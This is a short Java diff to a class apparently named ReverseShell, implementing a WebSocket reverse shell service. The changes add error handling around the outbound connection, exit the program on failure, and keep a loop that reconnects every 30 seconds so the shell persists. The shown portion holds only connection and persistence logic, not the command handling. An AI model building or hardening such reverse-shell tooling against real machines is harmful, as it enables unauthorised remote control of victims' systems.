@@ -54,12 +54,7 @@ public class ReverseShell implements WebsocketReverseShellService {
         } catch (Exception e) {
             e.printStackTrace();
 
-        } finally {
-            try {
-                client.stop();
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+            System.exit(0);
         }
 
 
@@ -72,12 +67,17 @@ public class ReverseShell implements WebsocketReverseShellService {
         while (true){
 
             WebSocketImpl socket = new WebSocketImpl();
+            try {
+                Future<Session> session = this.client.connect(socket, serverUri, new ClientUpgradeRequest());
 
-            Future<Session> session = this.client.connect(socket, serverUri, new ClientUpgradeRequest());
-
-            while (session.get().isOpen()){
+                while (session.get().isOpen()){
+//               don't create new sessions while the session is open
+                }
+            }catch (Exception e){
+               e.printStackTrace();
 
             }
+
 //            if connection is lost reconnect after 30 seconds
             Thread.sleep(30000);
 
